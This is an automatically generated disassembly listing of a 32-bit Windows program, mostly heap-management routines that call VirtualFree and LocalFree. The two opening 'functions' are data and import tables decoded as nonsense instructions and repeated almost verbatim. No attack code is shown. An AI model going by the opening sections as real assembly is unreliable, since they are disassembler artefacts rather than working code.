sub_4010aa
call [ eax + r-xdata ]
or al [ esi ]
push ebx
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + esi + 0x11 ] si
inc eax
add [ edi ] al
pop es
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x11 ] si
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] al
push ebx
jns r-xdata
imul ebp [ esi + 0x67 ] r-xdata
or ecx [ edx ]
push edi
imul esp [ ebp + 0x53 ] 0x6e697274
int3
add [ esi - 0x64 ] al
je r-xdata
sar bh 0x25
jb r-xdata
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x12
inc eax
add [ eax + 0x4011 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax ] cl
cmp [ eax ] eax
adc [ edx + 0x40 ] ah
add [ edx ] bl
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
sub al 0x62
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x11004036 ] dh
push esp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pushfd
insd
add [ eax ] al
push eax
adc [ eax ] eax
fdivr st1
dec eax
add [ ebx - 0x27da0040 ] cl
int1
dec eax
add [ ebx - 0x2bda0040 ] cl
int1
dec eax
add [ ebx - 0x2fda0040 ] cl
int1
dec eax
add [ ebx - 0x33da0040 ] cl
int1
dec eax
add [ ebx - 0x37da0040 ] cl
int1
dec eax
add [ ebx + 0x825ffc0 ] cl
dec eax
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub al 0x12
inc eax
add [ ecx ] dl
or edx [ edx + eax * 2 + 0x6f ]
jne r-xdata
and eax UnhandledExceptionFilter@IAT
mov eax eax
inc ecx
jb r-xdata
and eax __import_lookup_table_0(kernel32:WriteFile)
mov eax eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ esi ] al
push ebx
jns sub_4012c0
add [ eax ] al
add [ eax ] al
je r-xdata
add [ ebx - 0x3bda0040 ] cl
int1
dec eax
add [ ebx + 0x425ffc0 ] cl
dec eax
add [ ebx - 0x3fda0040 ] cl
int1
dec eax
add [ ebx - 0x43da0040 ] cl
int1
dec eax
add [ ebx - 0x47da0040 ] cl
int1
dec eax
add [ ebx - 0x4bda0040 ] cl
int1
dec eax
add [ ebx - 0x4fda0040 ] cl
int1
dec eax
add [ ebx - 0x53da0040 ] cl
int1
dec eax
add [ ebx - 0x57da0040 ] cl
int1
dec eax
add [ ebx - 0x5bda0040 ] cl
int1
dec eax
add [ ebx - 0x5fda0040 ] cl
int1
dec eax
add [ ebx - 0x63da0040 ] cl
int1
dec eax
add [ ebx - 0x67da0040 ] cl
int1
dec eax
add [ ebx - 0x6bda0040 ] cl
int1
dec eax
add [ ebx + 0x25ffc0 ] cl
dec eax
add [ ebx - 0x6fda0040 ] cl
int1
dec eax
add [ ebx - 0x73da0040 ] cl
int1
dec eax
add [ ebx - 0x77da0040 ] cl
int1
dec eax
add [ ebx + 0x1825ffc0 ] cl
dec eax
add [ ebx + 0x1425ffc0 ] cl
dec eax
add [ ebx + 0x1025ffc0 ] cl
dec eax
add [ ebx - 0x7bda0040 ] cl
int1
dec eax
add [ ebx - 0x7fda0040 ] cl
int1
dec eax
add [ ebx + 0x2825ffc0 ] cl
dec eax
add [ ebx + 0x2425ffc0 ] cl
dec eax
add [ ebx + 0x2025ffc0 ] cl
dec eax
add [ ebx + 0x7c25ffc0 ] cl
int1
dec eax
add [ ebx + 0x7825ffc0 ] cl
int1
dec eax
add [ ebx + 0x7425ffc0 ] cl
int1
dec eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x61 ] dl
dec eax
insd
sub_40117b
dec esp
add [ esp + 0x4 ] 0xfffffff8
jmp r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403774
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_40119e
inc eax
add [ edi - 0x6effbfef ] al
adc [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pushfd
adc [ eax ] eax
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x12
inc eax
add [ eax + 0x4011 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edx ] dl
inc eax
add [ eax + eax ] cl
add [ eax ] al
fcom [ eax ]
inc eax
add [ eax ] cl
cmp [ eax ] eax
adc [ edx + 0x40 ] ah
add [ edx ] bl
inc eax
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
sub al 0x62
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0x11004036 ] dh
push esp
dec ecx
outsb
je r-xdata
sar bh 0x25
jb r-xdata
fdivr st1
dec eax
add [ ebx - 0x27da0040 ] cl
int1
dec eax
add [ ebx - 0x2bda0040 ] cl
int1
dec eax
add [ ebx - 0x2fda0040 ] cl
int1
dec eax
add [ ebx - 0x33da0040 ] cl
int1
dec eax
add [ ebx - 0x37da0040 ] cl
int1
dec eax
add [ ebx + 0x825ffc0 ] cl
dec eax
popad
arpl [ ebp + 0x64 ] sp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx * 4 - 0x40 ] si
sub al 0x12
inc eax
add [ ecx ] dl
or edx [ edx + eax * 2 + 0x6f ]
jne r-xdata
and eax UnhandledExceptionFilter@IAT
mov eax eax
inc ecx
jb r-xdata
and eax __import_lookup_table_0(kernel32:WriteFile)
mov eax eax
popad
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ esi ] al
push ebx
jns sub_4012c0
add [ eax ] al
add [ eax ] al
je r-xdata
add [ ebx - 0x3bda0040 ] cl
int1
dec eax
add [ ebx + 0x425ffc0 ] cl
dec eax
add [ ebx - 0x3fda0040 ] cl
int1
dec eax
add [ ebx - 0x43da0040 ] cl
int1
dec eax
add [ ebx - 0x47da0040 ] cl
int1
dec eax
add [ ebx - 0x4bda0040 ] cl
int1
dec eax
add [ ebx - 0x4fda0040 ] cl
int1
dec eax
add [ ebx - 0x53da0040 ] cl
int1
dec eax
add [ ebx - 0x57da0040 ] cl
int1
dec eax
add [ ebx - 0x5bda0040 ] cl
int1
dec eax
add [ ebx - 0x5fda0040 ] cl
int1
dec eax
add [ ebx - 0x63da0040 ] cl
int1
dec eax
add [ ebx - 0x67da0040 ] cl
int1
dec eax
add [ ebx - 0x6bda0040 ] cl
int1
dec eax
add [ ebx + 0x25ffc0 ] cl
dec eax
add [ ebx - 0x6fda0040 ] cl
int1
dec eax
add [ ebx - 0x73da0040 ] cl
int1
dec eax
add [ ebx - 0x77da0040 ] cl
int1
dec eax
add [ ebx + 0x1825ffc0 ] cl
dec eax
add [ ebx + 0x1425ffc0 ] cl
dec eax
add [ ebx + 0x1025ffc0 ] cl
dec eax
add [ ebx - 0x7bda0040 ] cl
int1
dec eax
add [ ebx - 0x7fda0040 ] cl
int1
dec eax
add [ ebx + 0x2825ffc0 ] cl
dec eax
add [ ebx + 0x2425ffc0 ] cl
dec eax
add [ ebx + 0x2025ffc0 ] cl
dec eax
add [ ebx + 0x7c25ffc0 ] cl
int1
dec eax
add [ ebx + 0x7825ffc0 ] cl
int1
dec eax
add [ ebx + 0x7425ffc0 ] cl
int1
dec eax
add [ ebx - 0x3b7cac40 ] cl
mov esp 0xabb
add [ eax + ebp * 8 + 0x61 ] dl
dec eax
insd
sub_401404
push ebx
push esi
mov esi rw-data
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov [ esi ] edx
pop esi
pop ebx
retn
push 0x644
push 0x0
call sub_4013c4
mov ecx eax
test ecx ecx
jne r-xdata
mov eax [ rw-data ]
mov [ ecx ] eax
mov [ rw-data ] ecx
xor edx edx
xor eax eax
pop esi
pop ebx
retn
mov eax edx
add eax eax
lea eax [ ecx + eax * 8 + 0x4 ]
mov ebx [ esi ]
mov [ eax ] ebx
mov [ esi ] eax
inc edx
cmp edx 0x64
jne r-xdata
sub_40145c
push ebx
push esi
mov esi edx
mov ebx eax
call sub_401404
test eax eax
jne r-xdata
mov edx [ esi ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebx ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ edx + 0x4 ] eax
mov [ ebx ] eax
mov al 0x1
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_4014a4
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov [ esp ] edx
mov ebp eax
mov ebx [ ebp ]
mov eax [ esp ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
mov edx [ esi ]
add edx [ esi + 0x4 ]
cmp eax edx
jne r-xdata
mov eax ebx
call sub_40148c
mov eax [ ebx + 0x8 ]
mov [ esi ] eax
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
jmp r-xdata
mov ebx edi
cmp ebp ebx
jne r-xdata
mov eax ebx
call sub_40148c
mov eax [ ebx + 0xc ]
add [ esi + 0x4 ] eax
mov edi [ ebx ]
mov eax [ ebx + 0x8 ]
mov edx eax
add edx [ ebx + 0xc ]
cmp edx [ esi ]
jne r-xdata
mov edx esi
mov eax ebp
call sub_40145c
test al al
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esi ] eax
sub_401518
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx eax
mov edi ebx
mov ebx [ ebx ]
cmp edi ebx
jne r-xdata
mov ecx esi
add ecx [ edx + 0x4 ]
mov ebp eax
add ebp [ ebx + 0xc ]
cmp ecx ebp
ja r-xdata
mov esi [ edx ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jb r-xdata
xor eax eax
cmp esi eax
jne r-xdata
mov ecx [ edx ]
mov esi [ edx + 0x4 ]
add ecx esi
mov edi eax
add edi [ ebx + 0xc ]
cmp ecx edi
jne r-xdata
mov eax [ edx + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ edx + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx [ edx + 0x4 ]
mov [ esp ] ecx
sub edi ecx
mov [ esp + 0x4 ] edi
mov edx [ edx ]
sub edx eax
mov [ ebx + 0xc ] edx
mov edx esp
mov eax ebx
call sub_40145c
test al al
jne r-xdata
sub [ ebx + 0xc ] esi
jmp r-xdata
mov al 0x1
jmp r-xdata
mov eax ebx
call sub_40148c
jmp r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4015a8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp esi 0x100000
jge r-xdata
add esi 0xffff
and esi 0xffff0000
mov esi 0x100000
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_40145c
test al al
jne r-xdata
mov [ ebx + 0x4 ] esi
push 0x1
push 0x2000
push esi
push 0x0
call sub_4013d4
mov edi eax
mov [ ebx ] edi
test edi edi
je r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_40160c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov ebp eax
mov [ ebx + 0x4 ] 0x100000
push 0x4
push 0x2000
push 0x100000
push ebp
call sub_4013d4
mov edi eax
mov [ ebx ] edi
test edi edi
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
add esi 0xffff
and esi 0xffff0000
mov [ ebx + 0x4 ] esi
push 0x4
push 0x2000
push esi
push ebp
call sub_4013d4
mov [ ebx ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax rw-data
call sub_40145c
test al al
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx ]
push eax
call VirtualFree
xor eax eax
mov [ ebx ] eax
sub_401684
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov [ esp + 0x8 ] 0xffffffff
xor edx edx
mov [ esp + 0xc ] edx
mov ebp eax
mov eax [ esp ]
add eax ebp
mov [ esp + 0x10 ] eax
mov ebx [ rw-data ]
jmp r-xdata
cmp ebx rw-data
jne r-xdata
mov edi [ ebx ]
mov esi [ ebx + 0x8 ]
cmp ebp esi
ja r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ebx edi
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0x10 ]
ja r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
cmp esi [ esp + 0x8 ]
jae r-xdata
mov eax esi
add eax [ ebx + 0xc ]
cmp eax [ esp + 0xc ]
jbe r-xdata
mov [ esp + 0x8 ] esi
push 0x8000
push 0x0
push esi
call VirtualFree
test eax eax
jne r-xdata
mov [ esp + 0xc ] eax
mov eax ebx
call sub_40148c
mov [ rw-data ] 0x1
sub_40173c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edx eax
mov ebp edx
and ebp 0xfffff000
add edx [ esp ]
add edx 0xfff
and edx 0xfffff000
mov [ esp + 0x8 ] edx
mov eax [ esp + 0x4 ]
mov [ eax ] ebp
mov eax [ esp + 0x8 ]
sub eax ebp
mov edx [ esp + 0x4 ]
mov [ edx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebp ebx
jbe r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi [ esp + 0x8 ]
jbe r-xdata
mov ebx ebp
cmp edi ebx
jbe r-xdata
mov edi [ esp + 0x8 ]
mov esi [ esi ]
push 0x4
push 0x1000
sub edi ebx
push edi
push ebx
call sub_4013d4
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
sub_4017d0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov esi ebx
add esi 0xfff
and esi 0xfffff000
mov [ esp ] esi
mov ebp ebx
add ebp edx
and ebp 0xfffff000
mov eax [ esp ]
mov [ ecx ] eax
mov eax ebp
sub eax [ esp ]
mov [ ecx + 0x4 ] eax
mov esi [ rw-data ]
jmp r-xdata
cmp esi rw-data
jne r-xdata
mov ebx [ esi + 0x8 ]
mov edi [ esi + 0xc ]
add edi ebx
cmp ebx [ esp ]
jae r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp edi
jae r-xdata
mov ebx [ esp ]
cmp edi ebx
jbe r-xdata
mov edi ebp
mov esi [ esi ]
push 0x4000
sub edi ebx
push edi
push ebx
call VirtualFree
test eax eax
jne r-xdata
mov [ rw-data ] 0x2
sub_401850
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov edi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
jne r-xdata
cmp edi [ ebx + 0xc ]
jg r-xdata
mov edx esi
mov eax edi
call sub_4015a8
cmp [ esi ] 0x0
je r-xdata
mov ebx [ ebx ]
mov ecx esi
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_40173c
cmp [ esi ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebp
call sub_4014a4
cmp [ esp ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esi + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov ebx [ ebp ]
jmp r-xdata
mov ecx esp
mov edx [ esi + 0x4 ]
mov eax [ esi ]
call sub_401684
xor eax eax
mov [ esi ] eax
mov eax ebx
call sub_40148c
jmp r-xdata
sub_4018e0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ebp rw-data
add edi 0x3fff
and edi 0xffffc000
cmp ebx ebp
je r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
cmp esi [ ebx + 0x8 ]
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_40160c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp edi [ ebx + 0xc ]
jle r-xdata
mov ebx [ ebx ]
mov ebp [ ebx + 0x8 ]
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014a4
cmp [ esp + 0xc ] 0x0
jne r-xdata
lea ecx [ esp + 0x4 ]
mov edx edi
sub edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
add eax [ ebx + 0xc ]
call sub_40160c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
cmp edi [ ebx + 0xc ]
jg r-xdata
mov ebx [ ebp ]
jmp r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401684
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebp
call sub_4014a4
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov ecx [ esp ]
mov edx edi
mov eax ebp
call sub_40173c
mov eax [ esp ]
cmp [ eax ] 0x0
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
call sub_401684
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x4 ]
add [ ebx + 0x8 ] eax
mov eax [ esp ]
mov eax [ eax + 0x4 ]
sub [ ebx + 0xc ] eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax ebx
call sub_40148c
jmp r-xdata
sub_401a04
push ebx
push esi
push edi
add esp 0xffffffec
mov edi ecx
mov [ esp ] edx
lea ebx [ eax + 0x3fff ]
and ebx 0xffffc000
mov esi [ esp ]
add esi eax
and esi 0xffffc000
cmp ebx esi
jae r-xdata
xor eax eax
mov [ edi ] eax
mov ecx edi
mov edx esi
sub edx ebx
mov eax ebx
call sub_4017d0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax rw-data
call sub_4014a4
mov ebx [ esp + 0x4 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax ebx
call sub_401684
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x8 ] eax
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x4 ]
mov eax rw-data
call sub_401518
jmp r-xdata
sub_401a90
push ebp
mov ebp esp
xor edx edx
push ebp
push sub_401b46
push [ fs : edx ]
mov [ fs : edx ] esp
push rw-data
call sub_4013e4
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_401454
mov eax rw-data
call sub_401454
mov eax rw-data
call sub_401454
push 0xff8
push 0x0
call sub_4013c4
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
call sub_4013ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_401b4d
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x3
retn
push rw-data
call sub_4013f4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + eax * 4 - 0xc ] ecx
inc eax
cmp eax 0x401
jne r-xdata
mov eax rw-data
mov [ eax + 0x4 ] eax
mov [ eax ] eax
mov [ rw-data ] eax
mov [ rw-data ] 0x1
sub_401b54
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ebp
retn
xor edx edx
push ebp
push sub_401c2a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
mov eax [ rw-data ]
push eax
call LocalFree
xor eax eax
mov [ rw-data ] eax
mov ebx [ rw-data ]
jmp r-xdata
push rw-data
call sub_4013ec
cmp ebx rw-data
jne r-xdata
push 0x8000
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call VirtualFree
mov ebx [ ebx ]
mov eax rw-data
call sub_401454
mov eax rw-data
call sub_401454
mov eax rw-data
call sub_401454
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ eax ]
mov [ rw-data ] edx
push eax
call LocalFree
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call sub_4013fc
retn
push rw-data
call sub_4013f4
sub_401c34
push ebx
cmp eax [ rw-data ]
jne r-xdata
mov edx [ eax + 0x4 ]
mov ecx [ eax + 0x8 ]
cmp ecx 0x1000
jg r-xdata
mov edx [ eax + 0x4 ]
mov [ rw-data ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
cmp eax edx
jne r-xdata
test ecx ecx
jns r-xdata
test ecx ecx
jns r-xdata
sar ecx 0x2
mov ebx [ rw-data ]
mov [ ebx + ecx * 4 - 0xc ] edx
mov eax [ eax ]
mov [ edx ] eax
mov [ eax + 0x4 ] edx
pop ebx
retn
add ecx 0x3
sar ecx 0x2
mov eax [ rw-data ]
xor edx edx
mov [ eax + ecx * 4 - 0xc ] edx
jmp r-xdata
add ecx 0x3
pop ebx
retn
sub_401c98
mov edx [ rw-data ]
jmp r-xdata
cmp edx rw-data
jne r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jb r-xdata
mov [ rw-data ] 0x3
xor edx edx
mov edx [ edx ]
add ecx [ edx + 0xc ]
cmp eax ecx
jb r-xdata
mov eax edx
retn
sub_401cc8
push ebx
mov ecx edx
sub ecx 0x4
lea ebx [ ecx + eax ]
cmp edx 0x10
jl r-xdata
cmp edx 0x4
jl r-xdata
mov [ ebx ] 0x80000007
mov edx ecx
call sub_401e9c
pop ebx
retn
pop ebx
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
mov [ ebx ] ecx
sub_401d1c
cmp edx 0xc
jl r-xdata
cmp edx 0x4
jl r-xdata
or edx 0x2
mov [ eax ] edx
add eax 0x4
call sub_401cf8
retn
add eax edx
and [ eax ] 0xfffffffe
retn
mov ecx edx
or ecx 0x80000002
mov [ eax ] ecx
sub_401d44
push ebx
push esi
mov edx eax
sub edx 0x4
mov edx [ edx ]
mov ecx edx
and ecx 0x80000002
cmp ecx 0x80000002
je r-xdata
mov ebx edx
and ebx 0x7ffffffc
sub eax ebx
mov ecx eax
xor edx [ ecx ]
test edx 0xfffffffe
je r-xdata
mov [ rw-data ] 0x4
test [ ecx ] 0x1
je r-xdata
mov [ rw-data ] 0x5
mov eax ebx
pop esi
pop ebx
retn
mov edx eax
sub edx 0xc
mov esi [ edx + 0x8 ]
sub eax esi
cmp esi [ eax + 0x8 ]
je r-xdata
call sub_401c34
add ebx esi
mov [ rw-data ] 0x6
sub_401db4
push ebx
push esi
push edi
mov ebx eax
xor edi edi
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
test al 0x2
jne r-xdata
and eax 0x7ffffffc
add edi eax
add ebx eax
mov eax [ ebx ]
mov eax edi
pop edi
pop esi
pop ebx
retn
mov esi ebx
mov eax esi
call sub_401c34
mov eax [ esi + 0x8 ]
add edi eax
add ebx eax
and [ ebx ] 0xfffffffe
sub_401dec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi edx
mov esi eax
mov [ esp ] 0x0
mov eax esi
call sub_401c98
mov ebx eax
test ebx ebx
je r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ ebx + 0x8 ]
mov eax ebp
add eax [ ebx + 0xc ]
mov edx eax
lea ecx [ edi + esi ]
sub edx ecx
cmp edx 0xc
jg r-xdata
mov eax esi
sub eax ebp
cmp eax 0xc
jge r-xdata
mov edi eax
sub edi esi
lea ecx [ esp + 0x1 ]
mov edx edi
sub edx 0x4
lea eax [ esi + 0x4 ]
call sub_401a04
lea ecx [ esp + 0x1 ]
mov edx esi
sub edx [ ebx + 0x8 ]
add edx edi
mov eax ebp
call sub_401a04
jmp r-xdata
mov edx ebp
sub edx esi
mov eax esi
call sub_401cc8
mov eax ebp
add eax [ esp + 0x5 ]
mov edx [ ebx + 0x8 ]
add edx [ ebx + 0xc ]
cmp eax edx
jae r-xdata
mov ebp [ esp + 0x1 ]
test ebp ebp
je r-xdata
lea edx [ esp + 0x1 ]
mov eax ebx
call sub_401518
mov [ esp ] 0x1
lea edx [ edi + esi ]
sub edx eax
call sub_401d1c
sub_401e9c
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx edi
mov [ ebx + 0x8 ] esi
mov eax ebx
add eax esi
sub eax 0xc
mov [ eax + 0x8 ] esi
cmp esi 0x1000
jg r-xdata
cmp esi 0x3c00
jl r-xdata
mov edx esi
test edx edx
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ebx
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
mov edx esi
mov eax edi
call sub_401dec
test al al
jne r-xdata
sar edx 0x2
mov eax [ rw-data ]
mov eax [ eax + edx * 4 - 0xc ]
test eax eax
jne r-xdata
add edx 0x3
pop edi
pop esi
pop ebx
retn
mov edx [ eax ]
mov [ ebx + 0x4 ] eax
mov [ ebx ] edx
mov [ eax ] ebx
mov [ edx + 0x4 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov [ eax + edx * 4 - 0xc ] ebx
mov [ ebx + 0x4 ] ebx
mov [ ebx ] ebx
jmp r-xdata
sub_401f24
cmp [ rw-data ] 0x0
jle r-xdata
retn
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ rw-data ]
or eax 0x2
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
add eax 0x4
call sub_401cf8
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x7
jmp r-xdata
sub_401f70
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi esp
call sub_401f24
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax rw-data
call sub_4014a4
mov ebx [ esp + 0x8 ]
test ebx ebx
jne r-xdata
mov eax [ edi ]
cmp ebx eax
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi ]
add eax [ edi + 0x4 ]
mov esi ebx
add esi [ esp + 0xc ]
cmp eax esi
jae r-xdata
call sub_401d44
sub [ edi ] eax
add [ edi + 0x4 ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
add eax [ edi + 0x4 ]
cmp esi eax
jne r-xdata
call sub_401db4
add [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ rw-data ] eax
mov eax [ edi + 0x4 ]
mov [ rw-data ] eax
mov al 0x1
sub eax 0x4
mov edx 0x4
call sub_401cc8
sub [ edi + 0x4 ] 0x4
sub_401ffc
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
lea eax [ ebx + 0x4 ]
call sub_401850
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f70
test al al
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov al 0x1
sub_402028
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_4018e0
cmp [ esp ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax esp
call sub_401f70
test al al
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40205c
xor edx edx
test eax eax
jns r-xdata
sar eax 0x2
cmp eax 0x400
